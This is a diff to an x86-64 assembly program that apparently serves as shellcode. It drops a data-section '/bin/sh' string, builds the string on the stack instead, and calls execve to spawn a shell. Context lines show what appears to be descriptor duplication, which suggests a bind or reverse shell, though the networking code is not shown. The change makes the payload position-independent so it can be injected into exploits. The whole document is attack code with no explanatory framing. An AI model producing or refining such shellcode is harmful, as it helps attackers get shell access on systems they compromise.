@@ -1,8 +1,5 @@
 BITS 64
 
-section .data
-binsh db '/bin/sh',0
-
 section .text
 
 global _start
@@ -57,8 +54,19 @@ mov rdi, r13
 mov rsi, 2
 syscall
 
+sub rsp, 8
+
+mov byte [rsp], '/'
+mov byte [rsp+1], 'b'
+mov byte [rsp+2], 'i'
+mov byte [rsp+3], 'n'
+mov byte [rsp+4], '/'
+mov byte [rsp+5], 's'
+mov byte [rsp+6], 'h'
+mov byte [rsp+7], 0
+
 mov rax, 0x3b
-mov rdi, binsh
+mov rdi, rsp
 mov rsi, 0
 mov rdx, 0
 syscall
